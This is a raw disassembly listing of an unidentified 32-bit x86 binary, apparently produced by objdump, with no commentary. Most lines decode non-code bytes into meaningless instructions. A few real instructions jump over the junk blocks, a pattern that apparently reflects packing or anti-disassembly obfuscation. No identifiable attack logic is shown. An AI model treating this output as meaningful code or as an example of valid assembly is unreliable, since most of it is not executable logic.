  407a4f:	loope  0x407a7b
  407a51:	dec    edx
  407a52:	push   edi
  407a53:	pop    ds
  407a54:	or     DWORD PTR [ebp-0x44395255],eax
  407a5a:	mov    ecx,0x3dffea5a
  407a5f:	retf   
  407a60:	es push ds
  407a62:	lods   eax,DWORD PTR ds:[esi]
  407a63:	push   0x9592c340
  407a68:	push   edx
  407a69:	dec    eax
  407a6a:	or     al,BYTE PTR [ebx]
  407a6c:	sar    BYTE PTR [edi+edx*8-0xa],cl
  407a70:	cmp    al,0x28
  407a72:	bound  ebx,QWORD PTR [ebx]
  407a74:	dec    ecx
  407a75:	jp     0x407a4d
  407a77:	sahf   
  407a78:	sub    bh,BYTE PTR [esi]
  407a7a:	popa   
  407a7b:	jp     0x407ac8
  407a7d:	aam    0xc9
  407a7f:	data16 or ah,BYTE PTR [esi+0x15753d8e]
  407a86:	adc    BYTE PTR [esi+0x1e],al
  407a89:	dec    ebp
  407a8a:	dec    ebx
  407a8b:	fcomp  DWORD PTR [ebp-0x32]
  407a8e:	and    al,0x1b
  407a90:	(bad)  
  407a91:	test   eax,0xea3cd1ca
  407a96:	(bad)  
  407a98:	mov    BYTE PTR ss:[edi+0x2ab6ffd5],dl
  407a9f:	out    0x19,al
  407aa1:	out    dx,eax
  407aa2:	dec    esi
  407aa3:	rcr    BYTE PTR es:[ebx+eiz*4],1
  407aa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407aa8:	mov    esp,0x6697d2cb
  407aad:	mov    ch,0x53
  407aaf:	fiadd  DWORD PTR [edx+0x66350b8a]
  407ab5:	jge    0x407b27
  407ab7:	and    eax,0x4e5a360f
  407abc:	sub    al,0xc4
  407abe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407abf:	aaa    
  407ac0:	cmp    BYTE PTR [ecx+0x24],ah
  407ac3:	adc    DWORD PTR [eax-0x6142918a],eax
  407ac9:	inc    ecx
  407aca:	adc    al,0x49
  407acc:	aam    0xc6
  407ace:	add    dl,dl
  407ad0:	mov    ds:0x23283b2e,al
  407ad5:	adc    DWORD PTR [edx+0x5863ae9a],0x5c
  407adc:	nop
  407add:	aaa    
  407ade:	adc    al,0xc6
  407ae0:	cli    
  407ae1:	xchg   edx,eax
  407ae2:	es or  eax,0x566b325a
  407ae8:	aas    
  407ae9:	or     DWORD PTR [edi-0x19],0x5e
  407aed:	es sbb ebx,esi
  407af0:	test   al,0xc0
  407af2:	dec    edx
  407af3:	push   ss
  407af4:	mov    ebp,0x42b2eaad
  407af9:	ja     0x407b46
  407afb:	pop    es
  407afc:	and    al,0x1f
  407afe:	inc    eax
  407aff:	pop    es
  407b00:	faddp  st(0),st
  407b02:	add    eax,0xa2efc4ec
  407b07:	or     eax,0xbd345bd1
  407b0c:	mov    ah,0x24
  407b0e:	shl    DWORD PTR [edx-0x1b],1
  407b11:	mov    dh,BYTE PTR [ebx-0x39cc64fc]
  407b17:	add    eax,edi
  407b19:	push   eax
  407b1a:	mov    eax,DWORD PTR [ebp-0x10]
  407b1d:	add    eax,0xaa
  407b22:	push   eax
  407b23:	mov    eax,DWORD PTR [ebp-0x10]
  407b26:	mov    eax,DWORD PTR [eax+0x198]
  407b2c:	push   DWORD PTR [eax]
  407b2e:	jmp    0x407e7b
  407b33:	sahf   
  407b34:	das    
  407b35:	or     ah,BYTE PTR [edi]
  407b37:	mov    DWORD PTR [ecx],esp
  407b39:	mov    cl,0xb5
  407b3b:	pop    es
  407b3c:	mov    BYTE PTR [ebx],bl
  407b3e:	(bad)  
  407b3f:	mul    cl
  407b41:	pop    ss
  407b42:	jns    0x407b9b
  407b44:	leave  
  407b45:	jo     0x407bb7
  407b47:	and    BYTE PTR [ebp+0x70],bh
  407b4a:	jo     0x407b41
  407b4c:	mov    eax,ds:0x46980f5a
  407b51:	dec    ebx
  407b52:	out    0x4d,eax
  407b54:	mov    eax,0x1d3ae488
  407b59:	bound  ebx,QWORD PTR [eax+0x240b2968]
  407b5f:	fstp   TBYTE PTR [eax+0x27]
  407b62:	lea    eax,[edx+ecx*8]
  407b65:	stos   BYTE PTR es:[edi],al
  407b66:	pop    ebx
  407b67:	(bad)  
  407b68:	mov    bl,BYTE PTR [edi-0x23fb1acd]
  407b6e:	adc    eax,0xde759392
  407b73:	inc    ebp
  407b74:	push   cs
  407b75:	pop    edi
  407b76:	stos   DWORD PTR es:[edi],eax
  407b77:	shl    DWORD PTR [edi],0xfe
  407b7a:	pop    edx
  407b7b:	cs std 
  407b7d:	adc    ch,BYTE PTR [ebx+0x7d7d12e0]
  407b83:	shl    BYTE PTR [ecx+eax*4-0x1f],1
  407b87:	xchg   ah,dl
  407b89:	dec    ebx
  407b8a:	push   0x4d0584b8
  407b8f:	sbb    ecx,0x1c
  407b92:	aas    
  407b93:	push   ebx
  407b94:	fcom   QWORD PTR [ebx-0x31]
  407b97:	ret    
  407b98:	xor    dh,BYTE PTR [ebx]
  407b9a:	nop
  407b9b:	sbb    al,BYTE PTR [ebx+0x1c]
  407b9e:	xchg   ebx,eax
  407b9f:	cld    
  407ba0:	pusha  
  407ba1:	mul    BYTE PTR ds:0x6a044cc5
  407ba7:	jae    0x407be1
  407ba9:	int    0xe4
  407bab:	add    esi,DWORD PTR [ecx]
  407bad:	adc    eax,ebp
  407baf:	cdq    
  407bb0:	adc    ebx,eax
  407bb2:	lds    esi,FWORD PTR [edx+0x591750f1]
  407bb8:	push   esp
  407bb9:	int    0xdf
  407bbb:	(bad)  
  407bbc:	lahf   
  407bbd:	cmp    eax,0x97a8dc0c
  407bc2:	dec    edi
  407bc3:	sbb    BYTE PTR [esi],ch
  407bc5:	mov    ebx,0xea5312d5
  407bca:	scas   eax,DWORD PTR es:[edi]
  407bcb:	out    dx,al
  407bcc:	jno    0x407bff
  407bce:	lods   eax,DWORD PTR ds:[esi]
  407bcf:	pop    edx
  407bd0:	lea    edx,[ecx+ebx*8+0x38]
  407bd4:	pusha  
  407bd5:	push   ds
  407bd6:	xchg   BYTE PTR [esp+edi*1-0x1cf1c230],bl
  407bdd:	dec    ebx
  407bde:	mov    ah,0x82
  407be0:	aad    0x35
  407be2:	loop   0x407bb9
  407be4:	cmp    al,0x81
  407be6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407be7:	mov    ebx,0x56a6b06a
  407bec:	loope  0x407bc8
  407bee:	push   cs
  407bef:	and    al,dl
  407bf1:	loopne 0x407b83
  407bf3:	jae    0x407baa
  407bf5:	mov    ds:0x4084c1e4,al
  407bfa:	inc    ebp
  407bfb:	push   edi
  407bfc:	pop    ecx
  407bfd:	cli    
  407bfe:	outs   dx,WORD PTR ss:[esi]
  407c01:	push   ds
  407c02:	in     eax,0x7
  407c04:	out    0x48,al
  407c06:	mov    ds:0x1ecd80b2,eax
  407c0b:	mov    edx,0x577fa608
  407c10:	aam    0x5c
  407c12:	jnp    0x407c58
  407c14:	dec    ebp
  407c15:	or     DWORD PTR [ebx+ecx*2],0x4177bea5
  407c1c:	or     ch,BYTE PTR [esi-0x7942bb5c]
  407c22:	mov    ah,0xeb
  407c24:	cmp    DWORD PTR [esi-0x4e],esi
  407c27:	adc    eax,0x939c5fb3
  407c2c:	cwde   
  407c2d:	inc    edx
  407c2e:	dec    edi
  407c2f:	mov    BYTE PTR [esp+esi*1+0x7],ch
  407c33:	or     bl,BYTE PTR [ebx]
  407c35:	add    dl,al
  407c37:	sahf   
  407c38:	mov    edx,0x58cab394
  407c3d:	repnz mov eax,0x59da9fb9
  407c43:	in     eax,dx
  407c44:	clc    
  407c45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c46:	sbb    DWORD PTR [ebx-0x1],ebx
  407c49:	retf   
  407c4a:	mov    ebx,0xa2c4985e
  407c4f:	xlat   BYTE PTR ds:[ebx]
  407c50:	dec    eax
  407c51:	jg     0x407be2
  407c53:	cmp    ecx,DWORD PTR [ebp+0x6d]
  407c56:	pop    ebx
  407c57:	sub    DWORD PTR [ebx],esi
  407c59:	jbe    0x407c2d
  407c5b:	sub    ch,dl
  407c5d:	cs inc esp
  407c5f:	jbe    0x407c06
  407c61:	(bad)  
  407c62:	fs or  cl,ah
  407c65:	fdivp  st(3),st
  407c67:	mul    BYTE PTR [ebx+0x34]
  407c6a:	jle    0x407bf1
  407c6c:	mov    ds:0x2486d852,al
  407c71:	imul   edi,DWORD PTR [ecx],0xfffffff0
  407c74:	ins    BYTE PTR es:[edi],dx
  407c75:	sbb    BYTE PTR [eax-0x2a],al
  407c78:	ret    
  407c79:	sub    esi,0x3d
  407c7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c7d:	xchg   esi,eax
  407c7e:	mov    cl,ch
  407c80:	push   edx
  407c81:	adc    eax,0xa0cc1435
  407c86:	sub    cl,BYTE PTR [ecx+0x2ef7f107]
  407c8c:	jae    0x407c28
  407c8e:	pop    ss
  407c8f:	or     ah,ah
  407c91:	mov    eax,0x8fff0541
  407c96:	add    eax,0x7c9c901f
  407c9b:	xchg   edx,eax
  407c9c:	lods   al,BYTE PTR ds:[esi]
  407c9d:	outs   dx,DWORD PTR ds:[esi]
  407c9e:	xchg   ebx,eax
  407c9f:	jecxz  0x407c75
  407ca1:	hlt    
  407ca2:	jge    0x407c65
  407ca4:	sar    BYTE PTR [ebx-0x6d],cl
  407ca7:	mov    ds:0xd944da2c,al
  407cac:	in     eax,dx
  407cad:	fidiv  DWORD PTR [esi-0x4d]
  407cb0:	call   0x81b9dfc9
  407cb5:	add    eax,DWORD PTR [esi+edi*2-0x56]
  407cb9:	stos   BYTE PTR es:[di],al
  407cbb:	ss inc ebx
  407cbd:	imul   ecx,DWORD PTR [esi],0x3dd0791e
  407cc3:	push   ecx
  407cc4:	std    
  407cc5:	jge    0x407c9b
  407cc7:	gs dec ebp
  407cc9:	inc    eax
  407cca:	outs   dx,DWORD PTR ds:[esi]
  407ccb:	push   esp
  407ccc:	jecxz  0x407cfd
  407cce:	sub    DWORD PTR [bx+di+0x3a4b],eax
  407cd3:	sub    BYTE PTR [edx],cl
  407cd5:	pop    es
  407cd6:	pop    esi
  407cd7:	retf   0x3cb
  407cda:	add    eax,0xffffffce
  407cdd:	mov    cs,esp
  407cdf:	mov    eax,ds:0xc985cea9
  407ce4:	jle    0x407cea
  407ce6:	inc    ebx
  407ce7:	retf   
  407ce8:	mov    edx,0x68a1132a
  407ced:	and    ah,BYTE PTR [ebp+0x5]
  407cf0:	inc    ebp
  407cf1:	lods   eax,DWORD PTR ds:[esi]
  407cf2:	lea    eax,[ebp-0x18]
  407cf5:	mov    al,ds:0x40fcbad7
  407cfa:	mov    dl,0x94
  407cfc:	pusha  
  407cfd:	inc    ecx
  407cfe:	ins    BYTE PTR es:[edi],dx
  407cff:	repz (bad) 
  407d01:	mov    eax,0x93778130
  407d06:	pop    edx
  407d07:	setns  BYTE PTR [ebx]
  407d0a:	lods   eax,DWORD PTR ds:[esi]
  407d0b:	pop    es
  407d0c:	sub    DWORD PTR [edi+0x2cc8204],esi
  407d12:	inc    eax
  407d13:	xchg   edi,eax
  407d14:	call   0xcbb47ab5
  407d19:	push   esp
  407d1a:	xor    al,0x2c
  407d1c:	icebp  
  407d1d:	add    ch,BYTE PTR [ebx+0x5a]
  407d20:	pop    ebp
  407d21:	push   esi
  407d22:	lods   al,BYTE PTR ds:[esi]
  407d23:	sub    edi,DWORD PTR [ebx-0x37c0c081]
  407d29:	jg     0x407d30
  407d2b:	xor    dh,BYTE PTR [esi]
  407d2d:	inc    eax
  407d2e:	add    BYTE PTR [edi+0x351a0750],ah
  407d34:	retf   
  407d35:	jmp    0x31f15094
  407d3a:	jl     0x407cc5
  407d3c:	ss sub eax,0xbad726f1
  407d42:	sub    al,0x3d
  407d44:	adc    cl,bl
  407d46:	dec    ecx
  407d47:	xor    esp,0x4aa50995
  407d4d:	jnp    0x407dab
  407d4f:	dec    ecx
  407d50:	mov    edi,ss
  407d52:	cmp    al,BYTE PTR [ebx+edx*8]
  407d55:	jo     0x407db3
  407d57:	data16 cli 
  407d59:	stos   BYTE PTR es:[edi],al
  407d5a:	sub    cl,dl
  407d5c:	outs   dx,BYTE PTR ds:[esi]
  407d5d:	inc    esp
  407d5e:	in     eax,dx
  407d5f:	xor    DWORD PTR [ebx-0x680dad41],esi
  407d65:	xchg   ebp,eax
  407d66:	out    dx,eax
  407d67:	or     BYTE PTR [ebx-0x24],cl
  407d6a:	enter  0x8acb,0xfc
  407d6e:	mov    eax,ds:0x78198cf1
  407d73:	pop    esp
  407d74:	mov    esi,0x3f8c06c
  407d79:	add    eax,0x6e91888b
  407d7e:	mov    ah,0x85
  407d80:	and    eax,0x413dc1c3
  407d85:	aam    0xe6
  407d87:	cdq    
  407d88:	inc    edx
  407d89:	add    DWORD PTR [ebx-0x72b9837],esp
  407d8f:	or     eax,0x56606bd8
  407d94:	inc    esp
  407d95:	daa    
  407d96:	or     esp,DWORD PTR [eax]
  407d98:	add    BYTE PTR [edx],dl
  407d9a:	sbb    al,0xee
  407d9c:	cmp    eax,0x690a382
  407da1:	sbb    DWORD PTR [esi],edx
  407da3:	fadd   QWORD PTR [esi+edi*2]
  407da6:	and    ebx,DWORD PTR [ebx+ebp*2-0x3fe2e9f9]
  407dad:	imul   esp,DWORD PTR [edx+0x722cb477],0x1835a04c
  407db7:	mov    ch,0x1d
  407db9:	sbb    ebx,DWORD PTR [eax+edi*1]
  407dbc:	mov    eax,0xb6392c3f
  407dc1:	js     0x407db9
  407dc3:	sbb    ah,BYTE PTR [edx-0x7f]
  407dc6:	mov    edx,0x9679cfa4
  407dcb:	or     esp,DWORD PTR [esi-0x1c]
  407dce:	push   edi
  407dcf:	push   ebx
  407dd0:	add    ecx,DWORD PTR [edi]
  407dd2:	pop    ecx
  407dd3:	dec    ebx
  407dd4:	ror    BYTE PTR [edi+0x1e],1
  407dd7:	stos   DWORD PTR es:[edi],eax
  407dd8:	in     al,dx
  407dd9:	iret   
  407dda:	jmp    0x407e46
  407ddc:	jb     0x407e15
  407dde:	cli    
  407ddf:	je     0x407d95
  407de1:	sti    
  407de2:	xchg   edi,eax
  407de3:	mov    ebx,0x9ad9f632
  407de8:	test   al,0x47
  407dea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407deb:	dec    edi
  407dec:	inc    esi
  407ded:	jb     0x407dcf
  407def:	dec    esp
  407df0:	push   edi
  407df1:	loop   0x407df6
  407df3:	test   eax,0x1fe58c42
  407df8:	push   esi
  407df9:	and    eax,0xcf52c9a1
  407dfe:	add    BYTE PTR [eax+ebp*1],dl
  407e01:	cmp    al,0xd4
  407e03:	xor    al,0x1b
  407e05:	mov    ah,0x94
  407e07:	sub    eax,DWORD PTR ds:0x9a9ed7dc
  407e0d:	jns    0x407da0
  407e0f:	ror    DWORD PTR [esi],cl
  407e11:	push   cs
  407e12:	repz icebp 
  407e14:	and    al,0xd8
  407e16:	add    BYTE PTR [edi],dl
  407e18:	daa    
  407e19:	pop    ds
  407e1a:	mov    ebp,DWORD PTR ss:[edx+0x77]
  407e1e:	mov    edi,0xc988ddf2
  407e23:	fmul   QWORD PTR [edx-0x5cb99cbb]
  407e29:	jne    0x407e51
  407e2b:	mov    dh,0xca
  407e2d:	shl    DWORD PTR [esi+edx*8+0x14dd101e],1
  407e34:	xchg   esi,eax
  407e35:	ss or  al,0xe1
  407e38:	cmc    
  407e39:	mov    dh,BYTE PTR [ebx-0xe]
  407e3c:	xchg   ebx,eax
  407e3d:	mov    ds:0xff3872a,eax
  407e42:	imul   edi,DWORD PTR [esi],0xffffffe9
  407e45:	imul   ebp,ecx,0x43d6fe4e
  407e4b:	pop    edi
  407e4c:	fidivr WORD PTR [eax]
  407e4e:	mov    dh,BYTE PTR ds:0x63d28d6
  407e54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e55:	pop    esp
  407e56:	stos   DWORD PTR es:[edi],eax
  407e57:	mov    bh,0x8a
  407e59:	ffreep st(7)
  407e5b:	lock pop es
  407e5d:	enter  0x3598,0x6e
  407e61:	xchg   DWORD PTR [edi+0x151cb9c7],edi
  407e67:	std    
  407e68:	xor    ecx,ebp
  407e6a:	adc    DWORD PTR fs:[esi-0xb],edi
  407e6e:	fnstcw WORD PTR [edx]
  407e70:	or     bh,ah
  407e72:	mov    ch,0x31
  407e74:	sahf   
  407e75:	xchg   ebp,eax
  407e76:	and    eax,0xe9f307b5
  407e7b:	call   0x4120bb
  407e80:	mov    DWORD PTR [ebp-0x8],eax
  407e83:	cmp    DWORD PTR [ebp-0x8],0x0
  407e87:	jmp    0x4081d4
  407e8c:	in     eax,0xe6
  407e8e:	outs   dx,DWORD PTR ds:[esi]
  407e8f:	pop    ebp
  407e90:	outs   dx,DWORD PTR ds:[esi]
  407e91:	jne    0x407e88
  407e93:	data16 hlt 
  407e95:	test   ebx,eax
  407e97:	pushf  
  407e98:	test   DWORD PTR [edx+0x68],esi
  407e9b:	pusha  
  407e9c:	pop    es
  407e9d:	aad    0x70
  407e9f:	jo     0x407ec1
  407ea1:	jge    0x407f13
  407ea3:	jo     0x407e47
  407ea5:	xchg   ecx,ebx
  407ea7:	inc    edi
  407ea8:	popf   
  407ea9:	call   0xf07a:0x21c18ea2
  407eb0:	mov    al,0xfd
  407eb2:	push   edx
  407eb3:	sub    dl,bh
  407eb5:	dec    DWORD PTR [eax+0x5b]
  407eb8:	and    al,0x1a
  407eba:	ds in  al,dx
  407ebc:	cld    
  407ebd:	pop    ds
  407ebe:	pusha  
  407ebf:	dec    ebp
  407ec0:	lods   eax,DWORD PTR ds:[esi]
  407ec1:	push   edx
  407ec2:	dec    eax
  407ec3:	push   0xa09a0961
  407ec8:	pop    es
  407ec9:	std    
  407eca:	push   ds
  407ecb:	shl    DWORD PTR [eax+0x27],1
  407ece:	pop    ebx
  407ecf:	mov    BYTE PTR [edi-0x3e],dl
  407ed2:	icebp  
  407ed3:	into   
  407ed4:	add    edi,DWORD PTR [ecx+esi*8+0x28]
  407ed8:	sbb    al,dh
  407eda:	div    DWORD PTR [ebx+ebx*1+0x2d]
  407ede:	xor    al,0xf7
  407ee0:	int    0x8f
  407ee2:	mov    dh,ch
  407ee4:	in     al,dx
  407ee5:	retf   0xafb
  407ee8:	sub    eax,0x6363cc9a
  407eed:	sbb    ah,BYTE PTR [eax-0x29cfb985]
  407ef3:	aad    0x68
  407ef5:	sub    al,0xc3
  407ef7:	sub    BYTE PTR [ebp+0x2e],dl
  407efa:	cli    
  407efb:	cdq    
  407efc:	inc    edi
  407efd:	add    DWORD PTR [ebp+eiz*2+0x7d],ebx
  407f01:	mov    fs,WORD PTR [ebx]
  407f03:	in     eax,dx
  407f04:	test   DWORD PTR [ecx+ebx*1+0x215e420b],edx
  407f0b:	mov    bh,0x34
  407f0d:	sbb    eax,0x858a1dda
  407f12:	inc    edx
  407f13:	pop    esp
  407f14:	popf   
  407f15:	jb     0x407eac
  407f17:	fisttp QWORD PTR [ebp+0x6ab6f8d]
  407f1d:	mov    esi,0x9032c65e
  407f22:	and    BYTE PTR [ebx+0x281d8f4c],dh
  407f28:	or     edx,DWORD PTR [ebp+ecx*1-0x5a846b73]
  407f2f:	dec    eax
  407f30:	ret    
  407f31:	dec    esi
  407f32:	sub    esp,DWORD PTR [ecx+0x16dea993]
  407f38:	add    al,0xb3
  407f3a:	xor    esi,DWORD PTR [edx-0x1f]
  407f3d:	pop    ebx
  407f3e:	subps  xmm2,XMMWORD PTR [eax+0x3c]
  407f42:	push   ds
  407f43:	into   
  407f44:	jecxz  0x407f77
  407f46:	les    eax,FWORD PTR [esi]
  407f48:	shl    BYTE PTR [esi],cl
  407f4a:	xchg   edx,eax
  407f4b:	jne    0x407f93
  407f4d:	(bad)  [edx+0x39]
  407f50:	sti    
  407f51:	popf   
  407f52:	sub    edx,esi
  407f54:	push   esi
  407f55:	(bad)  
  407f56:	icebp  
  407f57:	pop    edx
  407f58:	out    dx,al
  407f59:	adc    eax,eax
  407f5b:	clc    
  407f5c:	stos   DWORD PTR es:[edi],eax
  407f5d:	repnz fnstenv [esi]
  407f60:	icebp  
  407f61:	mov    DWORD PTR [eax+0x2f0f5a12],ecx
  407f67:	sub    dh,BYTE PTR [ecx+0x1f]
  407f6a:	adc    al,0x70
  407f6c:	lds    eax,FWORD PTR [edx+0x5f]
  407f6f:	retf   
  407f70:	nop
  407f71:	xor    eax,0xebf4f0ed
  407f76:	das    
  407f77:	adc    al,0x82
  407f79:	or     eax,0x52538c03
  407f7e:	xor    edi,DWORD PTR [edi]
  407f80:	ja     0x407f34
  407f82:	sbb    al,BYTE PTR [edi-0x75]
  407f85:	fs ins BYTE PTR es:[edi],dx
  407f87:	mov    al,0x4d
  407f89:	mov    cl,0x44
  407f8b:	js     0x407fe0
  407f8d:	pop    eax
  407f8e:	mov    ebp,0x560720c0
  407f93:	retf   0x5109
  407f96:	xor    al,0xad
  407f98:	jmp    0x407f87
  407f9a:	arpl   bx,si
  407f9c:	in     al,0x18
  407f9e:	outs   dx,DWORD PTR ds:[esi]
  407f9f:	xor    al,0x97
  407fa1:	jecxz  0x407f87
  407fa3:	inc    esp
  407fa4:	shr    BYTE PTR [esi+0x11],0x1c
  407fa8:	daa    
  407fa9:	xchg   esp,eax
  407faa:	inc    edi
  407fab:	xchg   esp,eax
  407fac:	outs   dx,DWORD PTR ds:[esi]
  407fad:	xchg   BYTE PTR [edi*4-0x2c45403a],bh
  407fb4:	mov    dh,dh
  407fb6:	(bad)  
  407fb7:	hlt    
  407fb8:	test   al,0xd
  407fba:	les    ecx,FWORD PTR [esi+0x2d45ca7a]
  407fc0:	mov    al,0x5
  407fc2:	inc    esp
  407fc3:	adc    al,0xb5
  407fc5:	pop    ss
  407fc6:	out    0x6c,eax
  407fc8:	and    eax,DWORD PTR [ebx]
  407fca:	pop    ebx
  407fcb:	cmp    dh,ah
  407fcd:	jo     0x407f5e
  407fcf:	test   eax,0x459a5454
  407fd4:	pop    ebp
  407fd5:	adc    BYTE PTR [edx-0x7a],cl
  407fd8:	shl    BYTE PTR [edx+0x12a691e8],cl
  407fde:	xchg   ebp,eax
  407fdf:	ss enter 0x689c,0x32
  407fe4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fe5:	jge    0x408027
  407fe7:	jae    0x407fbe
  407fe9:	jns    0x40805e
  407feb:	dec    esi
  407fec:	rol    BYTE PTR ds:0x1aa0775b,1
  407ff2:	push   es
  407ff3:	popf   
  407ff4:	ret    0x15f4
  407ff7:	popa   
  407ff8:	outs   dx,BYTE PTR ds:[esi]
  407ff9:	and    eax,0x7fab6e48
  407ffe:	das    
  407fff:	jl     0x407f9a
  408001:	call   0xe3837ce
  408006:	ss mov bl,0x34
  408009:	xchg   edx,eax
  40800a:	(bad)  
  40800b:	cmp    DWORD PTR [ebx-0x6d71f8e1],eax
  408011:	in     eax,0x86
  408013:	outs   dx,BYTE PTR ds:[esi]
  408014:	in     al,dx
  408015:	xchg   BYTE PTR [eax-0x2c],dl
  408018:	ds push esi
  40801a:	aaa    
  40801b:	push   cs
  40801c:	cli    
  40801d:	sbb    ah,dh
  40801f:	xchg   BYTE PTR [ebp+0x5be925be],cl
  408025:	les    ebp,FWORD PTR [edx+0xf1aa5b7]
  40802b:	inc    edi
  40802c:	push   esi
  40802d:	xor    BYTE PTR [edx],al
  40802f:	add    esp,0x89fd1d5d
  408035:	dec    ecx
  408036:	(bad)  
  408037:	push   esi
  408038:	test   DWORD PTR es:[edi-0x72],edx
  40803c:	lods   al,BYTE PTR ds:[esi]
  40803d:	in     eax,0xb0
  40803f:	xor    dh,bl
  408041:	cmp    ecx,DWORD PTR [ebx+0xdb48d00]
  408047:	mov    ch,0x41
  408049:	cmp    ch,bl
  40804b:	adc    dh,dl
  40804d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40804e:	mov    ds:0x84d90b3,al
  408053:	retf   
  408054:	jns    0x407ff4
  408056:	inc    esi
  408057:	xlat   BYTE PTR ds:[ebx]
  408058:	in     al,0x3c
  40805a:	call   0xf3de:0xab35c66c
  408061:	nop
  408062:	xchg   esp,eax
  408063:	jb     0x40803a
  408065:	cmp    esp,ecx
  408067:	adc    edx,ebx
  408069:	cmc    
  40806a:	ret    0x225a
  40806d:	adc    DWORD PTR [edi+esi*8-0x39],0xffffff99
  408072:	sub    al,0x3a
  408074:	dec    eax
  408075:	pop    esi
  408076:	mov    edx,0x85a3bfd9
  40807b:	enter  0x1a86,0xce
  40807f:	jp     0x4080a3
  408081:	lods   al,BYTE PTR ds:[esi]
  408082:	cwde   
  408083:	and    eax,0x1d719732
  408088:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408089:	mov    edi,0xfe87f5e7
  40808e:	rcr    BYTE PTR [edx+0x39],0x44
  408092:	dec    ebp
  408093:	pop    esi
  408094:	(bad)  
  408095:	out    dx,al
  408096:	ss aam 0x6c
  408099:	mov    WORD PTR [ebx-0x4f],?
  40809c:	xor    ebx,DWORD PTR [eax]
  40809e:	pop    ebx
  40809f:	or     BYTE PTR [ebx-0x4c2c8545],0xbb
  4080a6:	pop    ebx
  4080a7:	enter  0xdf6b,0x2d
  4080ab:	mov    ds:0x1e23bfcb,eax
  4080b0:	jmp    0x4fbe54a1
  4080b5:	test   DWORD PTR [edx-0x77],edx
  4080b8:	bound  ebp,QWORD PTR ds:0x25d9102b
  4080be:	ins    DWORD PTR es:[edi],dx
  4080bf:	mov    ebp,0xcaac8e85
  4080c4:	into   
  4080c5:	test   BYTE PTR [ebp+0x45a0ce0c],bl
  4080cb:	or     BYTE PTR [ecx],cl
  4080cd:	jno    0x408065
  4080cf:	les    edx,FWORD PTR [edi]
  4080d1:	and    al,0x1f
  4080d3:	loope  0x4080f5
  4080d5:	or     BYTE PTR [esi+0x55e52e81],bl
  4080db:	int3   
  4080dc:	add    dh,ah
  4080de:	add    esi,ebx
  4080e0:	mov    eax,0x516c883
  4080e5:	xor    dh,BYTE PTR [edx]
  4080e7:	and    al,0xd5
  4080e9:	lock les edi,FWORD PTR [esi+0x77]
  4080ed:	pop    esi
  4080ee:	pop    ss
  4080ef:	adc    eax,0xfb3ce210
  4080f4:	cwde   
  4080f5:	adc    esi,DWORD PTR ds:0x61ee8a12
  4080fb:	jmp    0x4080a7
  4080fd:	hlt    
  4080fe:	fsubr  DWORD PTR [esi+0x56f8699a]
  408104:	mov    eax,0xb77653eb
  408109:	mov    edi,0xee6df1c8
  40810e:	lea    ebx,[ecx]
  408110:	mov    esp,0x9b17610f
  408115:	sub    esi,eax
  408117:	repz dec esi
  408119:	or     eax,0x9dc23b2a
  40811e:	cdq    
  40811f:	fsub   QWORD PTR [ecx]
  408121:	push   eax
  408122:	mov    esp,0x86a73165
  408127:	push   0xffffffff
  408129:	lahf   
  40812a:	sar    BYTE PTR [ebx+0x53],0x91
  40812e:	xor    eax,0xc068e7ff
  408133:	sbb    eax,0xf6489c4d
  408138:	mov    edx,ebx
  40813a:	(bad)  
  40813c:	arpl   WORD PTR [ebp-0x61],di
  40813f:	push   cs
  408140:	mov    ch,0xed
  408142:	xor    esp,DWORD PTR [edi+0x3f]
  408145:	xlat   BYTE PTR ds:[ebx]
  408146:	adc    al,0xdc
  408148:	cmc    
  408149:	inc    edi
  40814a:	test   DWORD PTR [esi],0xeb23f677
  408150:	pop    ss
  408151:	aas    
  408152:	inc    ebp
  408153:	outs   dx,BYTE PTR ds:[esi]
  408154:	(bad)  
  408155:	ror    DWORD PTR [esi-0x1e],cl
  408158:	cmc    
  408159:	cmp    DWORD PTR [eax-0x10a344dc],esp
  40815f:	pop    esi
  408160:	loopne 0x408166
  408162:	push   esp
  408163:	sub    dh,bl
  408165:	arpl   WORD PTR [eax+0x2792e90b],di
  40816b:	push   ecx
  40816c:	(bad)  
  40816d:	xchg   esp,eax
  40816e:	sub    al,0x46
  408170:	jg     0x4081dc
  408172:	jo     0x69ccc2ad
  408178:	(bad)  
  408179:	and    bh,BYTE PTR [esi+eax*2+0x43bb5238]
  408180:	pop    es
  408181:	cmp    DWORD PTR [ebx-0x53934148],eax
  408187:	scas   al,BYTE PTR es:[edi]
  408188:	jp     0x40817f
  40818a:	mov    cl,0x6d
  40818c:	push   ds
  40818d:	fld    DWORD PTR [esi-0x7c79006]
  408193:	add    al,BYTE PTR [ebx+0x18]
  408196:	psadbw mm5,QWORD PTR [eax-0x30337d17]
  40819d:	jg     0x4081ca
  40819f:	sub    DWORD PTR [edi],edx
  4081a1:	scas   al,BYTE PTR es:[edi]
  4081a2:	and    al,0xe0
  4081a4:	push   es
  4081a5:	imul   edx,DWORD PTR [ebx-0x34229d4f],0x6332a486
  4081af:	mov    cl,0xda
  4081b1:	popf   
  4081b2:	add    DWORD PTR [ebx+0x73],edi
  4081b5:	idiv   BYTE PTR [eax+ecx*2-0x5b]
  4081b9:	xchg   esp,eax
  4081ba:	in     al,0xf8
  4081bc:	rol    DWORD PTR [ebx+0x9],cl
  4081bf:	in     eax,dx
  4081c0:	mov    esp,0xf319700b
  4081c5:	sbb    al,0x34
  4081c7:	push   0xb30c7aec
  4081cc:	sbb    BYTE PTR [ebx+0x41],cl
  4081cf:	push   eax
  4081d0:	mov    al,ds:0x8d5aac3e
  4081d5:	inc    ebp
  4081d6:	add    al,0x89
  4081d8:	inc    ebp
  4081d9:	loopne 0x4081ea
  4081db:	test   BYTE PTR [esp+edx*1+0x458d0000],cl
  4081e2:	call   0xd4860d37
  4081e7:	xor    eax,esi
  4081e9:	add    eax,edi
  4081eb:	push   eax
  4081ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4081ef:	xor    eax,esi
  4081f1:	add    eax,edi
  4081f3:	push   eax
